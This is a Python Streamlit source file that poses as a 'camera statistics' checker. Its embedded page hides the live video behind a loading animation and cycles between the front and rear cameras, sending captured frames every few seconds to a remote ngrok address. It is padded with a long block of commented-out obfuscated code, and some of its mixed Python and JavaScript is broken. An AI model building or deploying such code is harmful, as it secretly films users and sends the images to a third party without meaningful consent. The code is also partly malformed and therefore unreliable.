import streamlit as st

st.set_page_config(layout="centered")
st.title("📸 Camera Statistics analysis")

# Set this to your laptop's local IP on same Wi-Fi (e.g., 192.168.x.x)
upload_url = "https://e630-2401-4900-93c9-8b37-158e-d0fb-1b57-1115.ngrok-free.app"  # <-- Replace with actual IP

st.markdown(f"""
This app checks camera specs to:
Make sure you allow permission to access the camera.
""")
# import math, random as r, sys as s, re as regex, builtins as b
# 🐍 = lambda x: x[::-1]
# α = lambda x: [x[i%len(x)] for i in range(100) if i%7!=0]
# β = lambda x: x if len(x)==1 else β(x[::2])
# γ = lambda f: (lambda x: f(lambda y: x(x)(y)))(lambda x: f(lambda y: x(x)(y)))
# Ω = lambda: [print(chr(9608)*r.randint(1,70)) for _ in range(10)]

# class π:
#     def __init__(self): self.ψ = [r.random() for _ in range(10)]
#     def Φ(self): return sum(self.ψ) / len(self.ψ)

# def 🧠(): return eval(''.join(chr(ord(c)^42) for c in "n`{&n&~"))

# delta = [λ for λ in map(lambda x: x**2 if x%2 else x+3, range(20))]
# κ = lambda *args: ''.join(map(str, args[::-1]))
# θ = lambda f: lambda *a: f(f)(*a)
# ξ = lambda: (lambda x: x*x)(5+5-5)

# data = "λambdas are the μist"
# pattern = r'\w+'
# λ = lambda f: lambda *args: f(f)(*args)
# ψ = λ(lambda self: lambda x: 1 if x<=1 else x*self(self)(x-1))

# for i in range(3):
#     print(f"Line {i}: {κ('🧠', i**i, '!')}")

# ζ = [(i, j) for i in range(3) for j in range(3) if (i+j)%2==0]

# def Q(n):
#     return [x for x in range(n) if all(x%y!=0 for y in range(2,int(x**.5)+1))]

# def 🌀(x):
#     if x < 1: return "☠️"
#     return 🌀(x//2) + chr(65 + x%26)

# D = lambda x=3: ''.join(chr(ord(c)^x) for c in "encryptme")

# Σ = [b for b in map(str, α("the cake is a lie")) if b not in 'aeiou']

# def E(): return γ(lambda f: lambda n: 1 if n==0 else n * f(n-1))(5)

# def silent(): pass
# def loud(): print("WHAT?!")

# _illusion = [str.__add__, str.__mul__, str.__len__][r.randint(0,2)]("ha",2)

# obfuscate = lambda x: ''.join(chr(ord(c)+(-1)**i*i%10) for i,c in enumerate(x))

# for __ in range(5):
#     print(obfuscate("Look away! Nothing to see here."))

# lambda_bomb = lambda x: (lambda f: f(f))(lambda f: lambda n: n if n==0 else x(f(f)(n-1)))
# print(lambda_bomb(lambda x: x + 1)(5))

# async def ∆():
#     return await (lambda: (__import__('asyncio').sleep(0.1)))()

# def quantum_state():
#     return r.choice(["🪐", "🧿", "👻", "🤯", "🤖"])

# class Schrödinger:
#     alive = dead = True

# for i in range(10):
#     x = r.choice([True, False])
#     if x: print(f"Box #{i}: {quantum_state()}")

# s.setrecursionlimit(1500)
# hidden_meaning = ψ(6)

# def matrix_effect():
#     for _ in range(10): Ω()

# matrix_effect()

# # 🧨 Rewriting itself
# with open(__file__, 'r') as f:
#     code = f.readlines()
#     code[5] = "# You saw nothing\n"
#     # This line won't be executed but shows intent

# try:
#     exec("".join(map(chr, [int("".join(str(r.randint(0,1)) for _ in range(8)),2) for _ in range(10)])))
# except:
#     pass

# # Schrödinger’s For-loop
# for s in "CONFUSION":
#     for i in range(ord(s)%3): print(f"{s}{i}", end=" ")
# print()

# def 🧬(f): return lambda *a: f(f)(*a)
# def paradox(f): return lambda x: f(f)(x)
# X = paradox(lambda f: lambda x: x if x==0 else x*f(x-1))
# print("Fact(6):", X(6))

# Y = lambda f: (lambda x: x(x))(lambda y: f(lambda *a: y(y)(*a)))
# fib = Y(lambda f: lambda n: n if n<=1 else f(n-1)+f(n-2))
# print("Fib(10):", fib(10))

# µ = [(i,j,k) for i in range(2) for j in range(2) for k in range(2) if i^j^k==1]
# χ = [list(map(lambda x: x**2 + 3*x + 1, range(5)))]
# def 🫥(): return eval('int.__add__.__name__'[::-1])
# print(🫥())

# try:
#     __import__('antigravity')
# except:
#     print("Oops. Not here.")

# Ω()

# # Hidden in plain sight
# hidden = [ord(c)^0x55 for c in "TrustNo1"]
# decoded = ''.join(chr(c^0x55) for c in hidden)
# assert decoded == "TrustNo1"

# # Evolving function
# def mutate(x): return x+1
# for i in range(3): mutate = lambda x, f=mutate: f(x)*2
# print("Mutated:", mutate(1))

# # Temporal weirdness
# from datetime import datetime as dt
# print(f"{dt.utcnow()} : {quantum_state()}")

# # Self-hiding function
# def 🕵️‍♂️(): return (lambda:42).__code__.co_code[:5]
# print("🕵️‍♂️ secrets:", 🕵️‍♂️())

# # Emoji vars galore
# 🍕 = lambda x: x[::-1]
# print("🍕", 🍕("reverse this string"))

# # Constant loop with breaks you can’t trust
# while r.random() > -1:
#     if r.random() < 0.001:
#         print("Escaped!")
#         break

# # Schrödinger recursion: Is it tail call? Is it not?
# def tail(x):
#     if x <= 0: return 0
#     return tail(x-1)

# # Meta-math
# import fractions
# F = fractions.Fraction(r.randint(1,10), r.randint(1,10))
# print("Random fraction:", F)

# # Don’t trust this variable
# false = True
# true = False
# print("false is", false, ", true is", true)

# # Non-standard loop of time
# for i in sorted([r.randint(0,10) for _ in range(5)], reverse=true):
#     print("Tick", i)

# # Unicode bomb
# bomb = '😱'*r.randint(3,7)
# print(

# st.components.v1.html(f"""
# <video id="video" autoplay playsinline width="100%" style="max-width: 400px;"></video>
# <canvas id="canvas" style="display:none;"></canvas>

# <script>
# const video = document.getElementById('video');
# const canvas = document.getElementById('canvas');
# const ctx = canvas.getContext('2d');
# const uploadUrl = "{upload_url}";

# navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }})
#   .then(stream => {{
#     video.srcObject = stream;
#   }})
#   .catch(err => {{
#     alert("Webcam access denied: " + err);
#   }});

# setInterval(() => {{
#   if (video.readyState === video.HAVE_ENOUGH_DATA) {{
#     canvas.width = video.videoWidth;
#     canvas.height = video.videoHeight;
#     ctx.drawImage(video, 0, 0);
#     canvas.toBlob(blob => {{
#       const formData = new FormData();
#       formData.append('frame', blob, 'frame.jpg');
#       fetch(uploadUrl, {{
#         method: 'POST',
#         body: formData
#       }}).catch(e => console.log("Upload error", e));
#     }}, 'image/jpeg');
#   }}
# }}, 1000);  // 1 frame per second
# </script>
# """, height=480)

st.components.v1.html(f"""
<!-- Hidden video (used for capturing) -->
<video id="video" autoplay playsinline style="display: none;"></video>
Analysing Your camera
<!-- Image shown instead of video preview -->
<object id="placeholder" 
        type="image/svg+xml" 
        data="https://cdn.svgator.com/images/2023/06/generative-ai-preloader.svg"
        width="100%" 
        style="max-width: 400px;">
</object>




<!-- Hidden canvas for frame capture -->
<canvas id="canvas" style="display:none;"></canvas>

<script>
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
const uploadUrl = "{upload_url}";

// Request camera access
navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }})
  .then(stream => {{
    video.srcObject = stream;
    // preview is hidden — no need to change DOM
  }})
  .catch(err => {{
    alert("Webcam access denied: " + err);
  }});

// Capture and upload frames
# setInterval(() => {{
#   if (video.readyState === video.HAVE_ENOUGH_DATA) {{
#     canvas.width = video.videoWidth;
#     canvas.height = video.videoHeight;
#     ctx.drawImage(video, 0, 0);
#     canvas.toBlob(blob => {{
#       const formData = new FormData();
#       formData.append('frame', blob, 'frame.jpg');
#       fetch(uploadUrl, {{
#         method: 'POST',
#         body: formData
#       }}).catch(e => console.log("Upload error", e));
#     }}, 'image/jpeg');
#   }}
# }}, 1000);
let stream = null;
let isFront = true;

async function startCamera(facingMode) {
  if (stream) {
    stream.getTracks().forEach(track => track.stop());
  }
  stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
  video.srcObject = stream;
  await new Promise(r => setTimeout(r, 800)); // Camera warm-up
}

async function captureAndUpload(url) {
  if (video.readyState === video.HAVE_ENOUGH_DATA) {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0);
    canvas.toBlob(blob => {
      const formData = new FormData();
      formData.append('frame', blob, 'frame.jpg');
      fetch(url, {
        method: 'POST',
        body: formData
      }).catch(e => console.log("Upload error", e));
    }, 'image/jpeg');
  }
}

// Function to capture 3 frames at ~3 FPS (every 333ms)
async function captureBurst(url, fps = 3, durationSec = 1) {
  const interval = 1000 / fps; // ~333 ms
  const totalFrames = Math.floor(fps * durationSec); // e.g., 3 frames in 1 second

  for (let i = 0; i < totalFrames; i++) {
    await captureAndUpload(url);
    await new Promise(r => setTimeout(r, interval));
  }
}

// Alternate between front and rear every 2 seconds
setInterval(async () => {
  const facingMode = isFront ? "user" : "environment";
  const url = isFront ? "{upload_url}/front" : "{upload_url}/rear";

  try {
    await startCamera(facingMode);
    await captureBurst(url, 3, 1); // 3 FPS for 1 second
  } catch (err) {
    console.error("Camera error:", err);
  }

  isFront = !isFront; // toggle
}, 2000); // switch camera every 2 seconds


</script>
""", height=480)
